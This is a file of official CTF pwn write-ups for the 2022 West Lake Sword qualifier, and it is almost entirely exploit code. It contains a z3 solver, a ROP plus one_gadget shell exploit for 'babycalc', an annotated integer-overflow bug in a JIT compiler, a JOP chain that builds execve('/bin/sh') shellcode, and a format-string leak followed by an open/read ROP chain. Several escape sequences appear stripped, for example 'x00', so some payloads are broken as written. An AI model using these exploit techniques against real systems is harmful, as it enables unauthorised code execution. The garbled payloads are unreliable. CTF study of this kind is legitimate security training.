# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/CTF大赛WP集合/articles/PWN｜西湖论剑·2022中国杭州网络安全技能大赛初赛官方Write_Up.md
# TITLE: PWN｜西湖论剑·2022中国杭州网络安全技能大赛初赛官方Write Up
# CATEGORY: pwn

from z3 import *

a=[BitVec("a%d"%i,8) for i in range(16)]

S=Solver()
S.add((a[0]*a[1]*a[2])-a[3] == 0x8d56)
S.add((a[0]*a[1]*a[2])+a[3] == 0x8de2)

S.add((a[0]-a[5]+a[10])*a[13] == 0x8043)
S.add((a[0]*a[1]-a[2])*a[3] == 0xac8a)
S.add((a[0]*a[1]+a[2])*a[3] == 0xc986)
S.add((a[4]*a[5]*a[6])-a[7] == 0xf06d)
S.add((a[1]+a[7]*a[12])+a[15] == 0x4a5d )
S.add((a[4]*a[5]*a[6])+a[7] == 0xf1af)
S.add((a[4]*a[5]-a[6])*a[7] == 0x8e03d)
S.add((a[4]*a[5]+a[6])*a[7] == 0x8f59f)
S.add((a[8]*a[9]*a[10])-a[11] == 0x152fd3)
S.add((a[8]*a[9]*a[10])+a[11] == 0x15309d)
S.add((a[8]*a[9]-a[10])*a[11] == 0x9c48a)
S.add((a[2]*a[8]-a[13])*a[9] == 0x4e639)
S.add((a[8]*a[9]+a[10])*a[11] == 0xa6bd2 )
S.add((a[12]*a[13]*a[14])-a[15] ==  0x8996d)
S.add((a[12]*a[13]*a[14])+a[15] == 0x89973)
S.add((a[12]*a[13]-a[14])*a[15] == 0x112e6)
S.add((a[12]*a[13]+a[14])*a[15] == 0x11376)

S.add(a[0] == 0x13)
S.add(a[8] == 0x32)
S.add(a[11] == 0x65)

if S.check() == sat:  
      m = S.model()  
      flag = '' 
      for i in range(16):  
          print hex(m[a[i]].as_long())

# result="x13x24x35x46x37x42x11xa1x32x83xd4x65x76xc7x18x03"
0x13
0x24
0x35
0x46
0x37
0x42
0x11
0xa1
0x32
0x83
0xd4
0x65
0x76
0xc7
0x18
0x3
from pwn import *
    #context.log_level="debug"
context.arch="amd64"

p=process("./babycalc")

elf=ELF("./babycalc")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

rdi=elf.search(asm(b"pop rdi ; ret")).next()
leave=elf.search(asm(b"leave ; ret")).next()
puts=elf.plt["puts"]
got=elf.got["puts"]
ret=leave+1
start=0x400650

sd = lambda s:p.send(s)
sl = lambda s:p.sendline(s)
rc = lambda s:p.recv(s)
ru = lambda s:p.recvuntil(s)
sda = lambda a,s:p.sendafter(a,s)
sla = lambda a,s:p.sendlineafter(a,s)

a="x13x24x35x46x37x42x11xa1x32x83xd4x65x76xc7x18x03"

for i in range(15):
 ru(":")
        sl(str(ord(a[i])))

rop1=flat(rdi,got,puts,start)

byte=0x18
pay=str(byte).ljust(8,"x00")
pay+=p64(ret)*21+rop1
pay+="x13x24x35x46x37x42x11xa1x32x83xd4x65x76xc7x18x03"
pay=pay.ljust((0x100-4),"2")+p32(0x38)
    #gdb.attach(p,"b *0x4007D4")
ru(":")

sd(pay)

ru("donen")
try:
 lib=u64(p.recv(6,timeout=1.5).ljust(8,"x00"))-libc.symbols["puts"]
 if(lib & 0xff0000000fff != 0x7f0000000000):
  raise Exception("error")
except Exception as e:
 print "try again !"
 exit(0)
print hex(lib)
one=lib+0xf1247 # [rsp+0x70] == NULL
for i in range(15):
 ru(":")
        sl(str(ord(a[i])))

byte=0x18
pay=str(byte).ljust(8,"x00")
pay+=p64(ret)*24+p64(one)
pay+="x13x24x35x46x37x42x11xa1x32x83xd4x65x76xc7x18x03"
pay=pay.ljust((0x100-4),"2")+p32(0x38)
ru(":")
sd(pay)

p.interactive()
char __cdecl Compiler::
var2idx(u8 varib)
{
  char result; // al
  u8 variba; // [rsp+Ch] [rbp-1Ch]

  if ( (varib & 0x7F) == 0 )
    fatal(); //如果变量序号为0，那么报错，说明序号从1开始
  if ( (varib & 0x80u) == 0 )
  { //变量序号最高位为0，访问参数
    if ( varib > Compiler::
ctx_args )
      fatal(); //若序号大于当前函数的参数数量则报错
    if ( (char)(8 * varib) <= 0 )
      fatal(); //检查result是否溢出
    result = 8 * varib;
  }
  else
  {
    variba = varib ^ 0x80;
    if ( variba > Compiler::
ctx_locals ) //若访问变量序号大于局部变量数，则报错
      fatal();
    if ( (char)(-8 * variba) > 0 )
      fatal(); //检查溢出，负数乘以正数若大于0显然溢出。但是这里没有检查等于0的情况，尽管variba!=0，仍然可能因为溢出导致-8*variba==0，例如variba=32时
    result = -8 * variba;
  }
  return result; //返回和变量序号有关的某个偏移
}
lea    rbp,[rsp-0x8] #设置rbp为被调用函数入口时的rsp
call func0 #调用序号为0的函数
hlt
48 81 ec xx xx xx xx : sub rsp,0x...(imm32)
48 8d 7d xx lea rdi,[rbp+idx]
...         <- rsp
-----------
| local 2 |
-----------
| local 1 |
-----------
| retaddr | <- rbp
-----------
| arg   1 |
-----------
| arg   2 |
-----------
48 be xx xx xx xx xx xx xx xx movabs rsi,0x.......(imm64)
0x0: movabs rsi,imm64(shellcode指令1，jmp rip+2)
0x10: movabs rsi,imm64(shellcode指令2,jmp rip+2)
push /shx00
pop rax
shl rax,32
push /bin
pop rdi
or rax,rdi #rax=/bin/shx00
push rax
mov rdi,rsp
xor rsi,rsi #rsi=0
xor rdx,rdx #rdx=0
push 0x3b #execve
pop rax
syscall
payload=b""
def newfunc(id,args,locals,retidx,ir): #创建函数
    global payload
    payload+=b"xff"+p8(id)+p8(args)+p8(locals)+ir+p8(0)+p8(retidx)
def A(x): #参数id转var序号
    return x
def L(x): #局部变量id转var序号
    return x|0b10000000
def movimm(idx,imm): #var=imm64
    return p8(1)+p8(idx)+p64(imm)
def andimm(idx,tmp,imm): #var和立即数进行and操作，结果写入var
    return movimm(tmp,imm)+p8(3)+p8(idx)+p8(tmp)
def orimm(idx,tmp,imm):
    return movimm(tmp,imm)+p8(4)+p8(idx)+p8(tmp)
def call(id,retidx,args): #调用函数
    return p8(6)+p8(id)+p8(retidx)+p8(len(args))+b''.join([p8(i) for i in args])

def jop(sc): #jop链构造函数
    assert(len(sc)<=6)
    return p8(1)+p8(L(1))+sc.ljust(6,b"x90")+b"xebx09" #jmp $+9
def exploit(p):
    newfunc(0,0,32,L(1), andimm(L(32),L(1),0xfffffffffffff000)+orimm(L(32),L(1),0x06b)) 
    #通过溢出，改写retaddr,由于ASLR特性，可以只改写后12位跳转到shellcode区
    sc=b"" #通过mov imm64指令在可执行内存页写入jop链
    sc+=jop(b"x68"+b"/shx00") #push /sh
    sc+=jop(b"x58x48xc1xe0x20") #pop rax,rax<<=32
    sc+=jop(b"x68"+b"/bin") #push /bin
    sc+=jop(b"x5fx48x09xf8") #pop rdi,rax|=rdi
    sc+=jop(b"x50x48x89xe7") #push rax,rdi=rsp
    sc+=jop(b"x48x31xf6x48x31xd2") #zero rsi,rdx
    sc+=jop(b"x6ax3bx58x0fx05") #syscall execve
    newfunc(1,0,1,L(1),sc) # jop链的容器函数，无作用只放置jop
    p.send(payload)
from pwn import *
context(os = "linux", arch = "amd64", log_level = "debug")

io = process("./pwn")
elf = ELF("./pwn")
libc = ELF('./libc.so.6')

io.sendlineafter("name:n", b'%31$p')
io.recvuntil("Hello, ")
libc.address = int(io.recv(14)[2:], 16) - 243 - libc.sym['__libc_start_main']
success("libc_base:t" + hex(libc.address))

bss_addr = elf.bss() + 0x100
payload = b'x00'*0xB0 + p64(bss_addr+0xB0) + p64(0x40136C)
io.sendafter("DASCTF:n", payload)

leave_addr = 0x4012e1
pop_rdi_ret = libc.address + 0x23b6a
pop_rsi_ret = libc.address + 0x2601f
pop_rdx_ret = libc.address + 0x142c92
flag_addr = bss_addr + 0x78
payload = p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(0) + p64(libc.sym['open'])
payload += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(bss_addr + 0xD0) + p64(pop_rdx_ret) + p64(0x50) + p64(libc.sym['read'])
payload += p64(pop_rdi_ret) + p64(bss_addr + 0xD0) + p64(libc.sym['puts']) + b'./flagx00'
payload = payload.ljust(0xB0, b'x00') + p64(bss_addr - 8) + p64(leave_addr)
io.sendafter("DASCTF:n", payload)
io.interactive()
